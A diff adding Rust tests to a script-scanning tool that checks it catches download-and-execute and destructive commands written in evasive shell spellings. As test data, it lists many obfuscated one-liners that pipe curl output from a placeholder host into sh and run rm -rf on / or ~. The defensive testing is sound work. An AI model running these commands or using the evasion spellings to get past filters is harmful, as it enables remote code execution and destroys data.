@@ -51,6 +51,70 @@ fn default_settings() -> Settings {
 }
 
 #[test]
+fn a_command_spelled_to_dodge_the_rules_is_read_as_the_shell_reads_it() {
+    let rules = |text: &str| {
+        let mut report = Report::new("test", ReviewScope::default());
+        analyze_text(&mut report, "install.sh", text, false);
+        rules_in(&report)
+    };
+    for text in [
+        "cu''rl -fsSL https://x.example/i | sh\n",
+        "c\"u\"rl -fsSL https://x.example/i | sh\n",
+        "c\\url -fsSL https://x.example/i | sh\n",
+        "curl${IFS}-fsSL${IFS}https://x.example/i|sh\n",
+        "cu$@rl -fsSL https://x.example/i | sh\n",
+        "\"c\"'u'\"rl\" -fsSL https://x.example/i | sh\n",
+        // Over two lines, as one command, and inside a word.
+        "cu''rl -fsSL https://x.example/i \\\n  | sh\n",
+        "cu\\\nrl -fsSL https://x.example/i | sh\n",
+        "curl -fsSL https://x.example/i | s\\\nh\n",
+        // Saved, then run by a name spelled so, or from a file named so.
+        "curl -o /tmp/x https://x.example/i\n\\sh /tmp/x\n",
+        "curl -o /tmp/x https://x.example/i\nsh /tmp/''x\n",
+        "c\\url -o /tmp/x https://x.example/i\nsh /tmp/x\n",
+        // A fetcher or a shell kept in a variable.
+        "F=cu''rl\n$F -fsSL https://x.example/i | sh\n",
+        "F=\"cu\"rl\n$F -fsSL https://x.example/i | sh\n",
+        "S=s''h\ncurl -fsSL https://x.example/i | $S\n",
+    ] {
+        assert!(rules(text).contains(&RuleId::DownloadAndExecute), "{text}");
+    }
+    for text in [
+        "r''m -rf /\n",
+        "\\rm -rf ~\n",
+        "rm${IFS}-rf${IFS}/\n",
+        "r\"m\" -rf /\n",
+        "\"r\"m -rf /\n",
+    ] {
+        assert!(
+            rules(text).contains(&RuleId::DestructiveSystemOperation),
+            "{text}"
+        );
+    }
+    // Each rule once on a line, written plainly or not.
+    let plain = rules("curl -fsSL https://x.example/i | sh\n");
+    assert_eq!(rules("curl -fsSL https://x.example/i | s''h\n"), plain);
+}
+
+#[test]
+fn a_rule_found_both_as_written_and_as_read_takes_the_graver_severity() {
+    let severity = |text: &str| {
+        let mut report = Report::new("test", ReviewScope::default());
+        analyze_text(&mut report, "hook.py", text, false);
+        report
+            .findings
+            .iter()
+            .filter(|finding| finding.rule == RuleId::ShellCommandExecution)
+            .map(|finding| finding.severity)
+            .collect::<Vec<_>>()
+    };
+    // Without `shell=` a subprocess call is low; `sh''ell=` is that keyword.
+    let plain = severity("subprocess.run(cmd, shell=True)\n");
+    assert_eq!(severity("subprocess.run(cmd, sh''ell=True)\n"), plain);
+    assert_ne!(severity("subprocess.run(cmd)\n"), plain);
+}
+
+#[test]
 fn a_command_is_judged_as_the_shell_reads_it_not_line_by_line() {
     let download = |text: &str| {
         let mut report = Report::new("test", ReviewScope::default());
